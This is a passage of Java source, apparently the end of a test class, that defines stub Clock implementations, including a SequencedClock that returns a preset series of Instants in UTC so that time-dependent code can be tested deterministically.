		@Override public Clock withZone(ZoneId zone) { return this; }
		@Override public Instant instant() { return now.get(); }
	}

	private static final class SequencedClock extends Clock {
		private final List<Instant> sequence;
		private int index;

		private SequencedClock(Instant... sequence) {
			this.sequence = List.of(sequence);
		}

		@Override public ZoneId getZone() { return ZoneOffset.UTC; }
		@Override public Clock withZone(ZoneId zone) { return this; }
		@Override public synchronized Instant instant() {
			return sequence.get(Math.min(index++, sequence.size() - 1));
		}
	}
}
